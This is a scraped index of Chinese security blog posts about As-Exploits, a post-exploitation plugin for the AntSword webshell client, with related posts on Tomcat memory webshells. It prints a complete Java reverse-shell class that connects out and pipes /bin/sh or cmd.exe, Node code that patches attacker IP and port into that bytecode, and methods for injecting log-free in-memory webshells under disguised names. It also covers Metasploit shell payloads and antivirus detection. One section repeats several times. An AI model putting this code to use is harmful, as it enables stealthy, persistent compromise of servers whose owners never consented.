前言冰蝎跟哥斯拉都有了各自的一些后渗透模块，然而蚁剑这一块基本还是空缺，所以就萌生出来做一个蚁剑的后渗透框架插件的想法。 目前插件的定位是蚁剑的一个微内核拓展模块，可以迅速做到payload的工程化，不用过多时间浪费在插件的结构上。目前的As-Exlpoits各部分之间基本做到了解耦，新增一个payload只需要两步：1.填写payload，2. 画一个表单。其余发包，回显处理等事情框架会自动帮你实现。想要自定义的话只需要继承父类然后重写对应方法即可。 因为http是无状态的，webshell能做的事情其实很有限，所以插件功能的重点主要放在msf，nmap等其他工具的联动上面，把专业的事情交给专业的工具去做。 ","date":"2020-12-01","objectID":"/posts/as-exploits/:1:0","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#前言"},{"categories":["技术文章"],"content":"\r2 总体设计一个模块在初始化之后的流程大概是这样 当exploit事件发生时，会调用getArgs跟genPayload函数来组合成最后的payload，默认将回显数据发送到编辑框里。 ","date":"2020-12-01","objectID":"/posts/as-exploits/:2:0","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#总体设计"},{"categories":["技术文章"],"content":"\r3 模块介绍简单的塞一些模块，没错我就是缝合怪。 ","date":"2020-12-01","objectID":"/posts/as-exploits/:3:0","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#模块介绍"},{"categories":["技术文章"],"content":"\r3.1 基本信息获取当前服务端信息。 ","date":"2020-12-01","objectID":"/posts/as-exploits/:3:1","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#基本信息"},{"categories":["技术文章"],"content":"\r3.2 反弹Shell跟MSF联动，与冰蝎和哥斯拉相比新增了bind类型的payload。 目前支持以下类型： java/meterpreter/reverse_tcp java/shell/reverse_tcp java/meterpreter/bind_tcp java/shell/bind_tcp php/meterpreter/reverse_tcp php/shell/reverse_tcp php/meterpreter/bind_tcp php/shell/bind_tcp ","date":"2020-12-01","objectID":"/posts/as-exploits/:3:2","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#反弹shell"},{"categories":["技术文章"],"content":"\r3.3 内存马一键打入内存Webshell。由于时间仓促，目前仅支持Servlet型内存马。核心payload修改自哥斯拉，继承了nolog的功能，即内存马不会在tomcat中留下日志。 可打入的内存马种类： AntSword Behinder Godzilla-Base64 reGerog 其中组件名称为注册的Servlet的名称，可以起一个具有迷惑性的名字来隐藏自己。 ","date":"2020-12-01","objectID":"/posts/as-exploits/:3:3","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#内存马"},{"categories":["技术文章"],"content":"\r3.4 内存马管理 获取当前Servlet 卸载指定Servlet ","date":"2020-12-01","objectID":"/posts/as-exploits/:3:4","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#内存马管理"},{"categories":["技术文章"],"content":"\r3.5 杀软识别 数据来源是key师傅的项目：avList 通过tasklist /svc获取当前进程列表，识别出其中的杀软。 目前支持手动跟自动两种获取方式： 自动获取 自动执行系统命令tasklist /svc并分析回显数据。 手动获取 手动输入tasklist /svc的结果。 ","date":"2020-12-01","objectID":"/posts/as-exploits/:3:5","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#杀软识别"},{"categories":["技术文章"],"content":"\r4 如何用node修改java字节码在本插件中所有额外参数都采用了直接修改字节码，而没有采用额外参数的方式来传参。蚁剑没有java环境，那么是如何做到用node修改字节码的呢？详细的例子可以看我博客这篇文章：无java环境修改字节码 其实我们的需求无非只是修改变量池中的一个字符串，并不需要asm框架那么强大的功能。java字节码常量池中共有14种类型，如下表格所示： 注意上面的表格的单位是错的，应该是byte不是bit 我们关注的应该是CONSTANT_utf8_info跟CONSTANT_String_info。如果变量是第一次被定义的时候是用CONSTANT_utf8_info标志，第二次使用的时候就变成了CONSTANT_String_info，即只需要tag跟面向字符串的索引。 也就是说关键的结构就是这个 其实跟PHP的序列化很相似，首先来个标志位表示变量的类型，然后是变量的长度，最后是变量的内容。 既然知道了其结构，那么修改的办法也就呼之欲出。除了修改变量的hex，只需要再把前面的变量长度给改一下就可以了。 把yan表哥的代码抽出来修改一下，yan表哥yyds。 function replaceClassStringVar(b64code, oldvar, newvar) { let code = Buffer.from(b64code, 'base64');//解码 let hexcode = code.toString('hex');//转为16进制 let hexoldvar = Buffer.from(oldvar).toString('hex');//转为16进制 let oldpos = hexcode.indexOf(hexoldvar); if (oldpos \u003e -1) {//判断字节码中是否包含目标字符串 let newlength = decimalToHex(newvar.length, 4);//计算新字符串长度 let retcode = `${hexcode.slice(0, oldpos - 4)}${newlength}${Buffer.from(newvar).toString('hex')}${hexcode.slice(oldpos + hexoldvar.length)}`;//把原来字节码的前后部分截出来，中间拼上新的长度跟内容 return Buffer.from(retcode, 'hex').toString('base64');//base64编码 } return b64code; } function decimalToHex(d, padding) { var hex = Number(d).toString(16); padding = typeof (padding) === \"undefined\" || padding === null ? padding = 2 : padding; while (hex.length \u003c padding) { hex = \"0\" + hex;//小于padding长度就填充0 } return hex; } content=`xxxxxxxxxxxxx`//要替换的字节码 content=replaceClassStringVar(content,'targetIP','192.168.88.129') content=replaceClassStringVar(content,'targetPORT','9999') console.log(content) ","date":"2020-12-01","objectID":"/posts/as-exploits/:4:0","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#如何用node修改java字节码"},{"categories":["技术文章"],"content":"\r5 编写模块","date":"2020-12-01","objectID":"/posts/as-exploits/:5:0","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#编写模块"},{"categories":["技术文章"],"content":"\r5.1 父类BaseBase是所有模块的基类，放了一些默认的方法。 顺着代码来说吧。 \"use strict\"; const LANG = require(\"../language\"); // 插件语言库 const LANG_T = antSword[\"language\"][\"toastr\"]; // 通用通知提示 const path = require(\"path\"); class Base { constructor(top) {//获取顶层对象 this.top = top; this.opt = this.top.opt; this.shelltype = this.top.opt.type; this.win = this.top.win; this.payloadtype=\"default\"; this.precheck(); } precheck() { //检查模块是否适用于当前shell类型 return true; } //获取payload模板 getTemplate(shelltype, payloadtype) { //从当前目录下payload.js中获取payload let payload = require(path.join(__dirname, this.name, \"payload\")); return payload[shelltype][payloadtype]; } //拼接参数 genPayload(args) { //从模板中拼接参数 let payload = this.getTemplate(this.shelltype, this.payloadtype); if (this.shelltype == \"jsp\") { //如果是jsp类型就用字节码的方式修改 for (let i in args) { payload = this.replaceClassStringVar(payload, i, args[i]); } } else { //否则直接进行字符串替换 for (let i in args) { payload = payload.replace(new RegExp(i, \"g\"), args[i]); } } return payload; } //获取表单参数 getArgs() { //所有表单参数要形成一个字典 return {}; } //执行 exploit() { // exploit！ console.log(\"exploit!\"); self.core = this.top.core; let args = this.getArgs(); //获取参数 let payload = this.genPayload(args); //拼接，生成payload self.core .request({ _: payload, //发送payload }) .then((_ret) =\u003e { let res = antSword.unxss(_ret[\"text\"], false); //过滤xss if (res === \"\") { res = \"output is empty.\"; } this.editor.session.setValue(res); //回显内容到输出结果 this.editor.setReadOnly(true); toastr.success(LANG[\"success\"], LANG_T[\"success\"]); }) .catch((e) =\u003e { console.log(e); toastr.error(JSON.stringify(e), \"Error\"); }); } setName(name) { this.name = name; //每个模块实例化之后要有个唯一的名字 } createLayout(tabbar) { //创建tab，总布局 tabbar.addTab(this.name, LANG[\"core\"][this.name][\"title\"]); let tab = tabbar.cells(this.name); this.tab = tab; if (this.name == \"base_info\") { //把基本信息设为首页 tab.setActive(); } let layout = tab.attachLayout(\"2E\"); this.layout = layout; let cellA = layout.cells(\"a\"); this.cellA=cellA; cellA.hideHeader(); let cellB = layout.cells(\"b\"); cellB.setText(LANG[\"result_title\"]); this.cellB=cellB; this.createEditor(cellB); this.createToolbar(cellA); this.createForm(cellA); } createEditor(cell) { //输出结果默认是编辑器的格式，方便复制 this.editor = null; // 初始化编辑器 this.editor = ace.edit(cell.cell.lastChild); this.editor.$blockScrolling = Infinity; this.editor.setTheme(\"ace/theme/tomorrow\"); // this.editor.session.setMode(`ace/mode/html`); this.editor.session.setUseWrapMode(true); this.editor.session.setWrapLimitRange(null, null); this.editor.setOptions({ fontSize: \"14px\", enableBasicAutocompletion: true, enableSnippets: true, enableLiveAutocompletion: true, }); // 编辑器快捷键 this.editor.commands.addCommand({ name: \"import\", bindKey: { win: \"Ctrl-S\", mac: \"Command-S\", }, exec: () =\u003e { // this.toolbar.callEvent(\"onClick\", [\"import\"]); }, }); const inter = setInterval(this.editor.resize.bind(this.editor), 200); this.win.win.attachEvent(\"onClose\", () =\u003e { clearInterval(inter); return true; }); } createForm(cell) { //edit your code } createToolbar(cell) { // 初始化exploit按钮，监听onClick事件 let self = this; let toolbar = cell.attachToolbar(); toolbar.attachEvent(\"onClick\", function (id) { try { self.exploit(); } catch (e) { toastr.error(JSON.stringify(e), LANG_T['error']); } }); toolbar.loadStruct( '\u003ctoolbar\u003e\u003citem type=\"button\" id=\"exploit\" text=\"exploit\" title=\"\" /\u003e\u003c/toolbar\u003e', function () {} ); if(this.precheck()==false){ //如果precheck不通过，按钮将变成灰色。 toolbar.disableItem('exploit'); } this.toolbar=toolbar; } replaceClassStringVar(b64code, oldvar, newvar) { //字节码修改函数 let code = Buffer.from(b64code, \"base64\"); let hexcode = code.toString(\"hex\"); let hexoldvar = Buffer.from(oldvar).toString(\"hex\"); let oldpos = hexcode.indexOf(hexoldvar); if (oldpos \u003e -1) { let newlength = this.decimalToHex(newvar.length, 4); let retcode = `${hexcode.slice(0, oldpos - 4)}${newlength}${Buffer.from( newvar ).toString(\"hex\")}${hexcode.slice(oldpos + hexoldvar.length)}`; return Buffer.from(retcode, \"hex\").toString(\"base64\"); } // console.log('nonono') return b64code","date":"2020-12-01","objectID":"/posts/as-exploits/:5:1","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#父类base"},{"categories":["技术文章"],"content":"\r5.2 简单的例子举一个简单的例子，执行系统命令并获取回显。 首先给插件起个炫酷的名字叫test，加入到根目录index.js的Modules里面。 然后在language\\zh.js中增加对应的标签名字：测试。 接着新增一个test目录，这里的目录名称要与模块的名称一致，里面放两个文件：index.js跟payload.js。 在index.js中主要写逻辑处理部分，payload.js里面只放payload。 5.2.1 payload.js默认的payload叫default。payload中把参数部分用一个特殊的名字标记出来，叫做 test_command 。 JSP类型同理，放base64格式的字节码。 module.exports={ php:{ default:`system(\"test_command\");` }, jsp:{ default:`` } }; 5.2.2 index.js因为例子中需要额外的参数，所以要重写父类的createForm函数跟getArgs函数，把表单中获取到的test_command放入args里面。 \"use strict\"; const Base = require(\"../base\"); class Test extends Base { createForm(cell) { var str = [ { type: \"input\", name: \"test_command\", label: \"执行命令\", labelWidth: 150, labelAlign:\"center\", inputWidth: 200, }, ]; var form = cell.attachForm(str); this.form = form; } getArgs() { let args = {}; this.payloadtype = \"default\"; args[\"test_command\"] = this.form.getItemValue(\"test_command\"); return args; } } module.exports = Test; 5.2.3 运行结果重启蚁剑后再打开插件就可以使用我们的新模块了，是不是很简单？ ","date":"2020-12-01","objectID":"/posts/as-exploits/:5:2","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#简单的例子"},{"categories":["技术文章"],"content":"\r5.2 简单的例子举一个简单的例子，执行系统命令并获取回显。 首先给插件起个炫酷的名字叫test，加入到根目录index.js的Modules里面。 然后在language\\zh.js中增加对应的标签名字：测试。 接着新增一个test目录，这里的目录名称要与模块的名称一致，里面放两个文件：index.js跟payload.js。 在index.js中主要写逻辑处理部分，payload.js里面只放payload。 5.2.1 payload.js默认的payload叫default。payload中把参数部分用一个特殊的名字标记出来，叫做 test_command 。 JSP类型同理，放base64格式的字节码。 module.exports={ php:{ default:`system(\"test_command\");` }, jsp:{ default:`` } }; 5.2.2 index.js因为例子中需要额外的参数，所以要重写父类的createForm函数跟getArgs函数，把表单中获取到的test_command放入args里面。 \"use strict\"; const Base = require(\"../base\"); class Test extends Base { createForm(cell) { var str = [ { type: \"input\", name: \"test_command\", label: \"执行命令\", labelWidth: 150, labelAlign:\"center\", inputWidth: 200, }, ]; var form = cell.attachForm(str); this.form = form; } getArgs() { let args = {}; this.payloadtype = \"default\"; args[\"test_command\"] = this.form.getItemValue(\"test_command\"); return args; } } module.exports = Test; 5.2.3 运行结果重启蚁剑后再打开插件就可以使用我们的新模块了，是不是很简单？ ","date":"2020-12-01","objectID":"/posts/as-exploits/:5:2","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#payloadjs"},{"categories":["技术文章"],"content":"\r5.2 简单的例子举一个简单的例子，执行系统命令并获取回显。 首先给插件起个炫酷的名字叫test，加入到根目录index.js的Modules里面。 然后在language\\zh.js中增加对应的标签名字：测试。 接着新增一个test目录，这里的目录名称要与模块的名称一致，里面放两个文件：index.js跟payload.js。 在index.js中主要写逻辑处理部分，payload.js里面只放payload。 5.2.1 payload.js默认的payload叫default。payload中把参数部分用一个特殊的名字标记出来，叫做 test_command 。 JSP类型同理，放base64格式的字节码。 module.exports={ php:{ default:`system(\"test_command\");` }, jsp:{ default:`` } }; 5.2.2 index.js因为例子中需要额外的参数，所以要重写父类的createForm函数跟getArgs函数，把表单中获取到的test_command放入args里面。 \"use strict\"; const Base = require(\"../base\"); class Test extends Base { createForm(cell) { var str = [ { type: \"input\", name: \"test_command\", label: \"执行命令\", labelWidth: 150, labelAlign:\"center\", inputWidth: 200, }, ]; var form = cell.attachForm(str); this.form = form; } getArgs() { let args = {}; this.payloadtype = \"default\"; args[\"test_command\"] = this.form.getItemValue(\"test_command\"); return args; } } module.exports = Test; 5.2.3 运行结果重启蚁剑后再打开插件就可以使用我们的新模块了，是不是很简单？ ","date":"2020-12-01","objectID":"/posts/as-exploits/:5:2","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#indexjs"},{"categories":["技术文章"],"content":"\r5.2 简单的例子举一个简单的例子，执行系统命令并获取回显。 首先给插件起个炫酷的名字叫test，加入到根目录index.js的Modules里面。 然后在language\\zh.js中增加对应的标签名字：测试。 接着新增一个test目录，这里的目录名称要与模块的名称一致，里面放两个文件：index.js跟payload.js。 在index.js中主要写逻辑处理部分，payload.js里面只放payload。 5.2.1 payload.js默认的payload叫default。payload中把参数部分用一个特殊的名字标记出来，叫做 test_command 。 JSP类型同理，放base64格式的字节码。 module.exports={ php:{ default:`system(\"test_command\");` }, jsp:{ default:`` } }; 5.2.2 index.js因为例子中需要额外的参数，所以要重写父类的createForm函数跟getArgs函数，把表单中获取到的test_command放入args里面。 \"use strict\"; const Base = require(\"../base\"); class Test extends Base { createForm(cell) { var str = [ { type: \"input\", name: \"test_command\", label: \"执行命令\", labelWidth: 150, labelAlign:\"center\", inputWidth: 200, }, ]; var form = cell.attachForm(str); this.form = form; } getArgs() { let args = {}; this.payloadtype = \"default\"; args[\"test_command\"] = this.form.getItemValue(\"test_command\"); return args; } } module.exports = Test; 5.2.3 运行结果重启蚁剑后再打开插件就可以使用我们的新模块了，是不是很简单？ ","date":"2020-12-01","objectID":"/posts/as-exploits/:5:2","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#imagepnghttpscdnnlarkcomyuque02020png15999081606809440392-6af21d42-c2fd-40da-8fbc-8102aeaf71e5png运行结果"},{"categories":["技术文章"],"content":"\r6 最后目前payload主要来自冰蝎跟哥斯拉，向前辈们致敬！ 框架的优势就在于看到其他同类工具的比较好的功能可以迅速白嫖。这个功能不错，下一秒就是我的了.jpg 项目地址：https://github.com/yzddmr6/As-Exploits ","date":"2020-12-01","objectID":"/posts/as-exploits/:6:0","series":null,"tags":["中国蚁剑"],"title":"As-Exploits: 中国蚁剑后渗透框架","uri":"/posts/as-exploits/#最后"},{"categories":["技术文章"],"content":"\r1 前言上次巅峰极客线下赛跟yan表哥面了基，一起磕了瓜子聊了聊天。结合当时的比赛情况回来之后想搓一个蚁剑的后渗透插件，今天想跟大家分享一下其中的一个点：无java环境如何修改字节码。 ","date":"2020-11-09","objectID":"/posts/node-edit-java-class/:1:0","series":null,"tags":[],"title":"无java环境修改字节码","uri":"/posts/node-edit-java-class/#前言"},{"categories":["技术文章"],"content":"\r2 正文","date":"2020-11-09","objectID":"/posts/node-edit-java-class/:2:0","series":null,"tags":[],"title":"无java环境修改字节码","uri":"/posts/node-edit-java-class/#正文"},{"categories":["技术文章"],"content":"\r2.1 需求在蚁剑改造计划之实现JSP一句话中，当时为了解决硬编码字节码的问题采用了额外参数的方式来传参。但是同时带来的问题就是键名的固定跟额外带来的编码问题，很容易成为一个特征。 例如 POST: ant=xxxxxxxxxxxxxxx\u0026var1=/bin/bash\u0026var2=whoami 蚁剑没有java环境，所以没办法像冰蝎一样调用asm框架来修改字节码。但是我们也不需要asm框架那么强大的功能，实际上只需要修改其中的一个字符串的值就可以了，那么怎么实现呢？这个要从字节码的结构说起。 ","date":"2020-11-09","objectID":"/posts/node-edit-java-class/:2:1","series":null,"tags":[],"title":"无java环境修改字节码","uri":"/posts/node-edit-java-class/#需求"},{"categories":["技术文章"],"content":"\r2.2 Java字节码结构这里以As_Exploits中的jsp反弹shell的payload为例 import java.io.*; import java.net.Socket; public class ShellReverseTCP extends Thread { InputStream zj; OutputStream sd; public static String ip; public static String port; ShellReverseTCP(InputStream zj, OutputStream sd) { this.zj = zj; this.sd = sd; } public ShellReverseTCP() { } @Override public boolean equals(Object obj){ ip=\"targetIP\"; port=\"targetPORT\"; try { RunShellReverseTCP(); return true; }catch (Exception e){ return false; } } public static void main(String[] args) { ip=\"192.168.88.129\"; port=\"9999\"; ShellReverseTCP shellReverseTCP = new ShellReverseTCP(); shellReverseTCP.RunShellReverseTCP(); } public void RunShellReverseTCP() { try { String ShellPath; if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) { ShellPath = new String(\"/bin/sh\"); } else { ShellPath = new String(\"cmd.exe\"); } Socket socket = new Socket(ip, Integer.parseInt(port)); Process process = Runtime.getRuntime().exec(ShellPath); (new ShellReverseTCP(process.getInputStream(), socket.getOutputStream())).start(); (new ShellReverseTCP(socket.getInputStream(), process.getOutputStream())).start(); } catch (Exception e) { } } public void run() { BufferedReader yx = null; BufferedWriter jah = null; try { yx = new BufferedReader(new InputStreamReader(this.zj)); jah = new BufferedWriter(new OutputStreamWriter(this.sd)); char buffer[] = new char[8192]; int length; while ((length = yx.read(buffer, 0, buffer.length)) \u003e 0) { jah.write(buffer, 0, length); jah.flush(); } } catch (Exception e) { } try { if (yx != null) yx.close(); if (jah != null) jah.close(); } catch (Exception e) { } } } main函数是调试用的不用管，入口是equals函数，我们的目的就是把其中的targetIP跟targetPORT替换为我们的目标IP跟端口。 用010editor打开编译后的字节码文件查看。 最开始的CAFEBABE叫做魔数，用来标志这是一个字节码文件。 00 00 00 34是版本号，0x34转为10进制是52，查表知是jdk1.8。 后面还有import的相关类的信息，因为不是重点，这里不再过多说明，快进到常量池。 常量池中的每一项都是一个表，其项目类型共有14种，如下表格所示： 类型 标志 描述 CONSTANT_utf8_info 1 UTF-8编码的字符串 CONSTANT_Integer_info 3 整形字面量 CONSTANT_Float_info 4 浮点型字面量 CONSTANT_Long_info 5 长整型字面量 CONSTANT_Double_info 6 双精度浮点型字面量 CONSTANT_Class_info 7 类或接口的符号引用 CONSTANT_String_info 8 字符串类型字面量 CONSTANT_Fieldref_info 9 字段的符号引用 CONSTANT_Methodref_info 10 类中方法的符号引用 CONSTANT_InterfaceMethodref_info 11 接口中方法的符号引用 CONSTANT_NameAndType_info 12 字段或方法的符号引用 CONSTANT_MethodHandle_info 15 表示方法句柄 CONSTANT_MothodType_info 16 标志方法类型 CONSTANT_InvokeDynamic_info 18 表示一个动态方法调用点 这14种类型的结构各不相同，如下表格所示： `` 注：上面的表格的单位是错的，应该是byte不是bit，不知道哪里的以讹传讹一直流传了下来。 从上面的表格可以看到，虽然每一项的结构都各不相同，但是他们有个共同点，就是每一项的第一个字节都是一个标志位，标识这一项是哪种类型的常量。 我们关注的应该是CONSTANT_utf8_info跟CONSTANT_String_info。如果变量是第一次被定义的时候是用CONSTANT_utf8_info标志，第二次使用的时候就变成了CONSTANT_String_info，即只需要tag跟面向字符串的索引。 也就是说关键的结构就是这个 其实跟PHP的序列化很相似，首先来个标志位表示变量的类型，然后是变量的长度，最后是变量的内容。 结合文件来看 targetIP共占了8个byte，也就是16个hex的位。所以前面两个byte是00 08。然后再之前的一个byte是01，表示这是一个CONSTANT_utf8_info。 ","date":"2020-11-09","objectID":"/posts/node-edit-java-class/:2:2","series":null,"tags":[],"title":"无java环境修改字节码","uri":"/posts/node-edit-java-class/#java字节码结构"},{"categories":["技术文章"],"content":"\r2.3 如何修改既然知道了其结构，那么修改的办法也就呼之欲出。除了修改变量的hex，只需要再把前面的变量长度给改一下就可以了。 把yan表哥的代码抽出来修改一下 function replaceClassStringVar(b64code, oldvar, newvar) { let code = Buffer.from(b64code, 'base64');//解码 let hexcode = code.toString('hex');//转为16进制 let hexoldvar = Buffer.from(oldvar).toString('hex');//转为16进制 let oldpos = hexcode.indexOf(hexoldvar); if (oldpos \u003e -1) {//判断字节码中是否包含目标字符串 let newlength = decimalToHex(newvar.length, 4);//计算新字符串长度 let retcode = `${hexcode.slice(0, oldpos - 4)}${newlength}${Buffer.from(newvar).toString('hex')}${hexcode.slice(oldpos + hexoldvar.length)}`;//把原来字节码的前后部分截出来，中间拼上新的长度跟内容 return Buffer.from(retcode, 'hex').toString('base64');//base64编码 } console.log('nonono') return b64code; } function decimalToHex(d, padding) { var hex = Number(d).toString(16); padding = typeof (padding) === \"undefined\" || padding === null ? padding = 2 : padding; while (hex.length \u003c padding) { hex = \"0\" + hex;//小于padding长度就填充0 } return hex; } content=`xxxxxxxxxxxxx`//要替换的字节码 content=replaceClassStringVar(content,'targetIP','192.168.88.129') content=replaceClassStringVar(content,'targetPORT','9999') console.log(content) 用命令还原一下文件 echo -n xxxxxx |baes64 -d |tee after.class 看一下修改后的结果 192.168.88.129总共是14个byte，换成16进制就是0xe，刚好符合。 实际中是否能用呢？ 回车，获得会话，说明修改是有效的。 ","date":"2020-11-09","objectID":"/posts/node-edit-java-class/:2:3","series":null,"tags":[],"title":"无java环境修改字节码","uri":"/posts/node-edit-java-class/#如何修改"},{"categories":["技术文章"],"content":"\r3 最后As_Exploits还在开发中，不得不说很麻烦，同一个功能要写asp/aspx/php/jsp四份代码。后端还可以写写，前端是真的要现学，不过还是可以期待一下。 ","date":"2020-11-09","objectID":"/posts/node-edit-java-class/:3:0","series":null,"tags":[],"title":"无java环境修改字节码","uri":"/posts/node-edit-java-class/#最后"},{"categories":[],"content":"蚁剑改造计划之支持内存马","date":"2020-09-06","objectID":"/posts/antsword-diy-5/","series":null,"tags":[],"title":"蚁剑改造计划之支持内存马","uri":"/posts/antsword-diy-5/"},{"categories":[],"content":"\r1 前言最近因为各种事情太忙了，博客也很久没有更新了。今天暂且先水一篇。 前几天发了一版新的蚁剑JSP一句话的payload，这篇文章记录一下更新的细节。 ","date":"2020-09-06","objectID":"/posts/antsword-diy-5/:1:0","series":null,"tags":[],"title":"蚁剑改造计划之支持内存马","uri":"/posts/antsword-diy-5/#前言"},{"categories":[],"content":"\r2 1. 兼容高版本JDK这个没啥好说的，就是base64解码的问题。在jdk9开始移除了sun.misc这个包，导致原有的sun.misc.BASE64Decoder没法继续使用，取而代之的是java.util.Base64这个类。 解决办法就是两个都试一下，看哪个能解码成功，核心代码如下 public byte[] base64Decode(String str) throws Exception { try { Class clazz = Class.forName(\"sun.misc.BASE64Decoder\"); return (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), str); } catch (Exception e) { Class clazz = Class.forName(\"java.util.Base64\"); Object decoder = clazz.getMethod(\"getDecoder\").invoke(null); return (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, str); } } ","date":"2020-09-06","objectID":"/posts/antsword-diy-5/:2:0","series":null,"tags":[],"title":"蚁剑改造计划之支持内存马","uri":"/posts/antsword-diy-5/#1-兼容高版本jdk"},{"categories":[],"content":"\r3 2. 兼容Tomcat内存马这个问题可以掰扯一下。很多文章都提到了冰蝎或者蚁剑连接内存马的问题。 除了由于写法问题而导致的各种乱七八糟的问题以外，其中主要的一个问题是冰蝎在入口处采用了pageContext这个类来获取request response session对象，本人以冰蝎为原型实现的蚁剑JSP一句话同样采用了pageContext作为入口。但是以filter型内存马为例，doFilter中三个参数分别是ServletRequest，ServletResponse，FilterChain，并不存在pageContext这个东西。 那么大体上有三种解决办法： 自己声明一个pageContext类，在里面实现对应的request跟response的getter setter。冰蝎改造之不改动客户端=\u003e内存马。 改写冰蝎的入口为request+response，不再采用pageContext作为入口。但是弊端就是不能再用equals了，要重新写一个方法用反射调用。冰蝎改造之适配基于tomcat Filter的无文件webshell 采用蚁剑原来的Custom模式，把恶意函数直接通过字节码打进去，然后通过方法名调用。不过由于直接编译恶意函数的字节码较大会超过最大长度限制，一般要先写入目标然后配合URLClassLoader才能使用。使用WebLogic CVE-2020-2883配合Shiro rememberMe反序列化一键注入蚁剑shell 以上的这些方法可以是可以，但是不够优雅。 回想我们最开始的问题，为什么要用pageContext，是为了拿到当前请求的上下文，更精确一点就是输入输出：request,response。经过实际调试可以发现： 在request中本身就包含了当前的response，同样response中也包含了当前的request。 虽然蚁剑没有用到session对象，但是需要的时候也可以通过request来获取。 也就是通过request或者response任意一个就能完全代替pageContext，这也是在新版payload中采取的方案。 核心代码如下 if (obj instanceof PageContext) { PageContext page = (PageContext) obj; request = (HttpServletRequest) page.getRequest(); response = (HttpServletResponse) page.getResponse(); } else if (obj instanceof HttpServletRequest) { request = (HttpServletRequest) obj; try { Field req = request.getClass().getDeclaredField(\"request\"); req.setAccessible(true); HttpServletRequest request2 = (HttpServletRequest) req.get(request); Field resp = request2.getClass().getDeclaredField(\"response\"); resp.setAccessible(true); response = (HttpServletResponse) resp.get(request2); } catch (Exception e) { e.printStackTrace(); } } else if (obj instanceof HttpServletResponse) { response = (HttpServletResponse) obj; try { Field resp = response.getClass().getDeclaredField(\"response\"); resp.setAccessible(true); HttpServletResponse response2 = (HttpServletResponse) resp.get(response); Field req = response2.getClass().getDeclaredField(\"request\"); req.setAccessible(true); request = (HttpServletRequest) req.get(response2); } catch (Exception e) { e.printStackTrace(); } } 在equals中收到一个对象后，会依次判断是否是PageContext/HttpServletRequest/HttpServletResponse，然后根据情况拿到request跟response，从而实现对内存马的兼容。 ","date":"2020-09-06","objectID":"/posts/antsword-diy-5/:3:0","series":null,"tags":[],"title":"蚁剑改造计划之支持内存马","uri":"/posts/antsword-diy-5/#2-兼容tomcat内存马"},{"categories":[],"content":"\r4 实现效果测试环境 在equals中填入request对象 访问内存马，一片空白说明注入成功。 访问任意路径即可连接。 正常执行命令，完美解决问题。 ","date":"2020-09-06","objectID":"/posts/antsword-diy-5/:4:0","series":null,"tags":[],"title":"蚁剑改造计划之支持内存马","uri":"/posts/antsword-diy-5/#实现效果"},{"categories":["技术文章"],"content":"tomcat-memory-webshell-listener","date":"2020-08-08","objectID":"/posts/tomcat-memory-webshell-listener/","series":null,"tags":[],"title":"Tomcat内存Webshell解析之Listener型","uri":"/posts/tomcat-memory-webshell-listener/"},{"categories":["技术文章"],"content":"\r1 前言本文首发于阿里安全响应中心https://www.anquanke.com/post/id/214483#h2-1 ","date":"2020-08-08","objectID":"/posts/tomcat-memory-webshell-listener/:1:0","series":null,"tags":[],"title":"Tomcat内存Webshell解析之Listener型","uri":"/posts/tomcat-memory-webshell-listener/#前言"},{"categories":["技术文章"],"content":"\r2 ListenerListener：通过listener可以监听web服务器中某一个执行动作，并根据其要求作出相应的响应。 以ServletRequestListener为例，ServletRequestListener主要用于监听ServletRequest对象的创建和销毁,一个ServletRequest可以注册多个ServletRequestListener接口。 每次请求创建时调用requestInitialized()。 每次请求销毁时调用requestDestroyed()。 Listener主要分为以下三个大类： ServletContext监听 Session监听 Request监听 其中前两种都不适合作为内存Webshell，因为涉及到服务器的启动跟停止，或者是Session的建立跟销毁，目光就聚集到第三种对于请求的监听上面，其中最适合作为Webshell的要数ServletRequestListener，因为我们可以拿到每次请求的的事件：ServletRequestEvent，通过其中的getServletRequest()函数就可以拿到本次请求的request对象，从而加入我们的恶意逻辑 。 2.0.1 实现步骤在ServletContext中可以看到addListener方法，发现此方法在ApplicationContext实现 javax.servlet.ServletContext#addListener(java.lang.String) 跟进org.apache.catalina.core.ApplicationContext#addListener(java.lang.String)，发现调用了同类中的重载方法 跟进org.apache.catalina.core.ApplicationContext#addListener(T)，发现遇到了跟添加filter很相似的情况，在开始会先判断Tomcat当前的生命周期是否正确，否则就抛出异常。实际上最核心的代码是调用了 this.context.addApplicationEventListener(t)，所以我们只需要反射调用addApplicationEventListener既可达到我们的目的。 public \u003cT extends EventListener\u003e void addListener(T t) { if (!this.context.getState().equals(LifecycleState.STARTING_PREP)) { throw new IllegalStateException(sm.getString(\"applicationContext.addListener.ise\", new Object[]{this.getContextPath()})); } else { boolean match = false; if (t instanceof ServletContextAttributeListener || t instanceof ServletRequestListener || t instanceof ServletRequestAttributeListener || t instanceof 